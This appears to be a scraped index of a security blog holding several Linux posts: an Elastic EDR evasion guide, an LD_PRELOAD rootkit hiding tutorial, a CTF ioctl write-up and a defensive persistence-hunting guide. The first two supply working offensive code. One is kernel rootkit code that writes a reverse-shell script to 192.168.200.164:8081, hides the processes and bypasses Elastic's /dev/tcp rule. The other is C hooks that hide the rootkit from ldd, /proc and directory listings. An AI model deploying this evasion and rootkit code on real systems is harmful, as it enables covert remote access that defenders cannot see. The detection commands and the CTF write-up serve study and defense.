alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it 